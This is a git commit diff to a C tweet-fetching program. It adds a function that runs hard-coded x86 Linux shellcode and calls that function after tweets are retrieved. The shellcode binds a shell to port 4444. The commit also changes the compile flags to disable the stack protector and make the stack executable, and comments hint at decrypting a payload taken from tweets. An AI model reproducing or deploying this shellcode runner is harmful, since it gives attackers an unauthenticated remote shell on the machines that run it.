b3afbe6115f3ae0039096da7bb3615f8a6ad5377
Brett Lischalk <blischalk@opinionlab.com>
2017-01-23 17:52:04 -0600

    Add code to execute shellcode in buffer

--- get.c
+++ get.c
@@ -5,7 +5,7 @@
  * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
  * Compile with:
  *
- * gcc -o get get.c -loauth -lcurl
+ * gcc -g -o get get.c -loauth -lcurl -Og -foptimize-sibling-calls -fno-stack-protector -z execstack
  *
  * @TODO:
  * (In Progress) Pull latest tweets from a twitter feed
@@ -77,6 +77,28 @@ void InitializeTweets(void)
   }
 }
 
+void ExecuteTweet(void)
+{
+    // Decrypt here
+    // Cast to function pointer
+    // Execute
+
+    unsigned char code[] = \
+    "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
+    "\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
+    "\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
+    "\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
+    "\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
+    "\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+    "\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
+
+    printf("About to execute\n");
+    int (*ret)() = (int(*)())code;
+    ret();
+    printf("Executed\n");
+}
+
 int main(int argc, const char *argv[])
 {
     InitializeTweets();
@@ -134,6 +156,8 @@ int main(int argc, const char *argv[])
 
       //printf("%lu bytes retrieved\n", (long)chunk.size);
       PopulateTweets(chunk.memory,0);
+      printf("About to call ExecuteTweet\n");
+      ExecuteTweet();
     }
 
     printf("The third tweet is: \n");
